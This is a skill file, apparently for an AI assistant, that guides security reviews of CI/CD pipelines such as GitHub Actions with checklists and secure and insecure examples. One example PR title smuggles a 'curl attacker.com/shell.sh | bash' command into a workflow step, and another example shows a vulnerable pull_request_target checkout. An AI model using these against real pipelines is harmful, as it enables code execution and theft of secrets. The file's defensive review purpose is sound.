---
name: sec-cicd
description: >
  CI/CD pipeline security review skill. Analyzes GitHub Actions, GitLab CI,
  Jenkins, CircleCI for secret exposure, dependency confusion, pipeline
  injection, excessive permissions, and supply chain attack vectors. Trigger
  on /sec cicd, or when user shares .github/workflows/*.yml, Jenkinsfile,
  .gitlab-ci.yml, or asks is my pipeline secure, CI/CD security review,
  GitHub Actions hardening, pipeline injection, check my workflows.
---

# sec-cicd — CI/CD Pipeline Security Review

Your pipeline has root access to production. Treat it that way.

---

## Supported Platforms

| Platform | Files |
|----------|-------|
| GitHub Actions | .github/workflows/*.yml |
| GitLab CI | .gitlab-ci.yml |
| Jenkins | Jenkinsfile |
| CircleCI | .circleci/config.yml |
| Azure Pipelines | azure-pipelines.yml |

---

## Phase 1: Permissions Audit

GitHub Actions — missing or overly broad permissions:
```yaml
# CRITICAL: No permissions key = write access on most events
permissions:
  contents: write
  id-token: write    # OIDC token — cloud access
  actions: write     # Can modify workflows = privilege escalation

# SECURE: Minimum required
permissions:
  contents: read
```

Checks:
- [ ] permissions key present at workflow level
- [ ] id-token:write only on jobs that need OIDC cloud auth
- [ ] contents:write only when repo modification is required
- [ ] pull_request_target with checkout of PR code + secrets = CRITICAL

The pull_request_target trap — runs in context of base repo but executes
attacker-controlled code from the PR:
```yaml
on:
  pull_request_target:
jobs:
  test:
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Attacker code
      - run: ./ci/test.sh   # Attacker script + your secrets = full compromise
```

---

## Phase 2: Expression Injection

```yaml
# CRITICAL: Untrusted input directly in run: step
- name: Process PR title
  run: echo "${{ github.event.pull_request.title }}"
  # Attacker PR title: "; curl attacker.com/shell.sh | bash; echo "

# SECURE: Use env var intermediary
- name: Process PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"
```

Injection-prone contexts — never interpolate directly into run::
- github.event.issue.title / body
- github.event.pull_request.title / body
- github.event.comment.body
- github.head_ref
- github.event.*.name (labels, milestone names)

---

## Phase 3: Third-Party Action Supply Chain

```yaml
# CRITICAL: Mutable tag — can change any time
- uses: actions/checkout@v3
- uses: actions/checkout@main

# SECURE: Pin to immutable SHA
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
```

Checks:
- [ ] All uses: pinned to full commit SHA (not tags or branches)
- [ ] Third-party actions from unknown/unvetted publishers
- [ ] Actions from forks rather than official repos
- [ ] uses: docker:// pulling mutable Docker images
- [ ] Actions with < 100 stars, recently created

---

## Phase 4: Self-Hosted Runner Security

```yaml
# HIGH: Self-hosted runner on public repo — any fork can trigger
runs-on: self-hosted
```

Checks:
- [ ] Self-hosted runners on public repositories
- [ ] Self-hosted runner with Docker socket or root access
- [ ] Shared runners across prod and non-prod environments
- [ ] Runner cloud credentials exceed pipeline needs
- [ ] Persistent runners (should be ephemeral — cleaned between jobs)

---

## Phase 5: Secret Management

- [ ] Secrets scoped to minimum level (repo > environment > org)
- [ ] Production secrets in environment with protection rules (reviewer approval)
- [ ] Environment deployment branches restricted to main/release
- [ ] No org-level secrets used by unvetted repos
- [ ] Hardcoded credentials anywhere in workflow files

OIDC vs long-lived credentials:
```yaml
# BAD: Long-lived AWS credentials stored as secrets
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_KEY_ID }}

# GOOD: Short-lived OIDC token — no stored credentials
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789:role/GitHubActions
    aws-region: us-east-1
```

---

## Phase 6: Deployment Security

- [ ] Deployments only from protected branches (main, release/*)
- [ ] Required reviewers before production deployment
- [ ] Manual approval gates for production
- [ ] Secrets not logged during deployment steps
- [ ] Post-deployment verification steps defined

---

## Severity Ratings

| Finding | Severity |
|---------|----------|
| pull_request_target + untrusted checkout | Critical |
| Expression injection in run: step | Critical |
| Self-hosted runner on public repo | Critical |
| Hardcoded credentials in workflow | Critical |
| Production secrets accessible from PR workflows | High |
| Actions pinned to mutable tags | High |
| id-token:write on all jobs | High |
| No required reviewers on prod deployment | High |
| Excessive permissions scope | High |
| Secrets passed to unvetted third-party actions | High |
| No environment protection rules | Medium |
| Persistent self-hosted runners | Medium |
| No artifact signing | Medium |

---

## Output

Write findings to CICD-SECURITY-REPORT.md. Terminal summary:
```
[sec-cicd] CI/CD Pipeline Security Review
Workflows analyzed:  XX
Findings:            XX (Critical: X | High: X | Medium: X | Low: X)
Critical: pull_request_target injection risk in deploy.yml
High:     Actions not SHA-pinned (12 workflows affected)
Full report: CICD-SECURITY-REPORT.md
```

## File Structure
```
sec-cicd/
├── SKILL.md
├── references/
│   ├── injection-contexts.md
│   ├── dangerous-patterns.md
│   ├── trusted-actions.md
│   └── oidc-setup-guides.md
└── scripts/
    ├── workflow_analyzer.py
    └── action_sha_pinner.py
```
